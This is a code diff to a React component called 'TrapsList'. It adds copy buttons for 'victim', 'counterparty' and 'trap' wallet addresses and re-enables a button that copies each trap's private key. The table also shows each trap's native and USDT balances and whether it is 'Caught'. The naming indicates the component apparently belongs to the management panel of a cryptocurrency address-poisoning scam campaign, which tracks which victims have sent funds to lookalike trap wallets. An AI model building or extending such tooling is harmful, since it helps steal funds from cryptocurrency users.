@@ -20,11 +20,11 @@ interface Balance {
 export default function TrapsList({
   campaignId,
   initialBalances = [],
-  traps: initialTraps = [], // ✅ added optional traps prop
+  traps: initialTraps = [],
 }: {
   campaignId: string;
   initialBalances?: Balance[];
-  traps?: Trap[]; // ✅ new optional prop
+  traps?: Trap[];
 }) {
   // ─── State ───
   const [traps, setTraps] = useState<Trap[]>(initialTraps);
@@ -41,6 +41,7 @@ export default function TrapsList({
   const [loading, setLoading] = useState(initialTraps.length === 0);
   const [refreshing, setRefreshing] = useState(false);
   const [copying, setCopying] = useState<Record<string, boolean>>({});
+  const [copiedCells, setCopiedCells] = useState<Record<string, boolean>>({}); // ✅ for address copy
 
   // ─── Fetch traps (paginated) ───
   const fetchTraps = async (showLoading = true) => {
@@ -107,6 +108,7 @@ export default function TrapsList({
     return balances[trapAddress.toLowerCase()] || null;
   };
 
+  // ─── Copy private key (existing) ───
   const copyPrivateKey = async (trapId: string, trapAddress: string) => {
     setCopying((prev) => ({ ...prev, [trapId]: true }));
     try {
@@ -128,6 +130,15 @@ export default function TrapsList({
     } finally {
       setCopying((prev) => ({ ...prev, [trapId]: false }));
     }
+  };
+
+  // ─── Copy address helper ───
+  const copyAddress = (text: string, key: string) => {
+    navigator.clipboard.writeText(text);
+    setCopiedCells((prev) => ({ ...prev, [key]: true }));
+    setTimeout(() => {
+      setCopiedCells((prev) => ({ ...prev, [key]: false }));
+    }, 2000);
   };
 
   const totalPages = Math.ceil(total / limit);
@@ -195,23 +206,80 @@ export default function TrapsList({
                   const balance = getBalance(trap.trap_address);
                   const isCopying = copying[trap.id] || false;
                   const isCopied = copying[`copied_${trap.id}`] || false;
+
+                  const victimCopied = copiedCells[`victim-${trap.id}`] || false;
+                  const counterpartyCopied = copiedCells[`counterparty-${trap.id}`] || false;
+                  const trapCopied = copiedCells[`trap-${trap.id}`] || false;
+
                   return (
                     <tr key={trap.id} className="hover:bg-gray-700/20 transition-colors">
-                      <td className="px-4 py-3 text-gray-300 font-mono text-xs">
-                        {trap.victim_address.slice(0, 10)}…{trap.victim_address.slice(-8)}
+                      {/* Victim Address */}
+                      <td className="px-4 py-3">
+                        <div className="flex items-center gap-1">
+                          <span className="text-gray-300 font-mono text-xs">
+                            {trap.victim_address.slice(0, 10)}…{trap.victim_address.slice(-8)}
+                          </span>
+                          <button
+                            onClick={() => copyAddress(trap.victim_address, `victim-${trap.id}`)}
+                            className="p-0.5 hover:bg-gray-600/50 rounded transition-colors"
+                            title="Copy address"
+                          >
+                            {victimCopied ? (
+                              <Check size={12} className="text-green-400" />
+                            ) : (
+                              <Copy size={12} className="text-gray-400 hover:text-white" />
+                            )}
+                          </button>
+                        </div>
                       </td>
-                      <td className="px-4 py-3 text-gray-400 font-mono text-xs">
-                        {trap.counterparty_address ? (
-                          <>
-                            {trap.counterparty_address.slice(0, 10)}…{trap.counterparty_address.slice(-8)}
-                          </>
-                        ) : (
-                          <span className="text-gray-500">Wildcard</span>
-                        )}
+
+                      {/* Counterparty Address */}
+                      <td className="px-4 py-3">
+                        <div className="flex items-center gap-1">
+                          {trap.counterparty_address ? (
+                            <>
+                              <span className="text-gray-400 font-mono text-xs">
+                                {trap.counterparty_address.slice(0, 10)}…{trap.counterparty_address.slice(-8)}
+                              </span>
+                              <button
+                                onClick={() => copyAddress(trap.counterparty_address!, `counterparty-${trap.id}`)}
+                                className="p-0.5 hover:bg-gray-600/50 rounded transition-colors"
+                                title="Copy address"
+                              >
+                                {counterpartyCopied ? (
+                                  <Check size={12} className="text-green-400" />
+                                ) : (
+                                  <Copy size={12} className="text-gray-400 hover:text-white" />
+                                )}
+                              </button>
+                            </>
+                          ) : (
+                            <span className="text-gray-500">Wildcard</span>
+                          )}
+                        </div>
                       </td>
-                      <td className="px-4 py-3 text-gray-300 font-mono text-xs">
-                        {trap.trap_address.slice(0, 10)}…{trap.trap_address.slice(-8)}
+
+                      {/* Trap Address */}
+                      <td className="px-4 py-3">
+                        <div className="flex items-center gap-1">
+                          <span className="text-gray-300 font-mono text-xs">
+                            {trap.trap_address.slice(0, 10)}…{trap.trap_address.slice(-8)}
+                          </span>
+                          <button
+                            onClick={() => copyAddress(trap.trap_address, `trap-${trap.id}`)}
+                            className="p-0.5 hover:bg-gray-600/50 rounded transition-colors"
+                            title="Copy address"
+                          >
+                            {trapCopied ? (
+                              <Check size={12} className="text-green-400" />
+                            ) : (
+                              <Copy size={12} className="text-gray-400 hover:text-white" />
+                            )}
+                          </button>
+                        </div>
                       </td>
+
+                      {/* Balances */}
                       <td className="px-4 py-3 text-green-400 font-mono text-xs">
                         {balance ? parseFloat(balance.native).toFixed(6) : '…'}
                       </td>
@@ -221,6 +289,8 @@ export default function TrapsList({
                       <td className="px-4 py-3 text-blue-400 font-mono text-xs">
                         {balance ? parseFloat(balance.tokens.USDT || '0').toFixed(4) : '…'}
                       </td>
+
+                      {/* Status */}
                       <td className="px-4 py-3">
                         <span
                           className={`px-2 py-1 text-xs rounded-full ${
@@ -232,8 +302,10 @@ export default function TrapsList({
                           {trap.is_caught ? 'Caught' : 'Active'}
                         </span>
                       </td>
+
+                      {/* Actions */}
                       <td className="px-4 py-3">
-                        {/* <button
+                        <button
                           onClick={() => copyPrivateKey(trap.id, trap.trap_address)}
                           disabled={isCopying}
                           className="flex items-center gap-1 px-2 py-1 text-xs bg-gray-700/50 hover:bg-gray-600/50 rounded transition-colors disabled:opacity-50"
@@ -249,7 +321,7 @@ export default function TrapsList({
                               <span>Copy Key</span>
                             </>
                           )}
-                        </button> */}
+                        </button>
                       </td>
                     </tr>
                   );
